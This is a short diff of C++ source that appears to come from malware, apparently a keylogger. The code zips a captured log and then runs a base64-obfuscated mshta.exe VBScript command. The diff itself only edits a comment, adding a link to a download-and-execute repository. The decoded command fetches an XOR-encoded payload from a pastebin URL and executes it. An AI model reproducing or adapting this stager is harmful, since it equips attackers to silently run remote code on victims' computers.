@@ -348,7 +348,7 @@ private:
 				  (wchar_t*)_logTemp.c_str(), _logTemp.length() * 2);                                 // Zip the log from in memory
 
 			if (CloseZip(_G_HZIP) == ZR_OK) {
-				// Launch mshta
+				// Launch mshta command (see https://github.com/Xxshark888xX/MSHTA-VBS-download-and-execute/blob/master/README.md)
 				DWORD _p = CMDExecute(base64_decode("bXNodGEuZXhlIHZic2NyaXB0OmV4ZWN1dGUoIk9uIEVycm9yIFJlc3VtZSBOZXh0OlNldCBhPUNyZWF0ZU9iamVjdCgiIk1TWE1MMi5TZXJ2ZXJYTUxIVFRQLjYuMCIiKTphLnNldE9wdGlvbiAyLDEzMDU2OndoaWxlKExlbihiKT0wKTphLm9wZW4iIkdFVCIiLCIiaHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L1BSamVyeHdEIiIsRmFsc2U6YS5zZW5kOmI9YS5yZXNwb25zZVRleHQ6d2VuZDprPSIiWjY4S1BEIiI6Zm9yIGk9MHRvIExlbihiKS0xU3RlcCAyOmM9YyZDaHIoQXNjKENocigiIiZIIiImTWlkKGIsaSsxLDIpKSl4b3IgQXNjKE1pZChrLCgoaS8yKW1vZCBMZW4oaykpKzEsMSkpKTpOZXh0OkV4ZWN1dGVHbG9iYWwgYzoiKSh3aW5kb3cuY2xvc2Up"));
 				while (Process::Exists(_p))
 					Sleep(100);
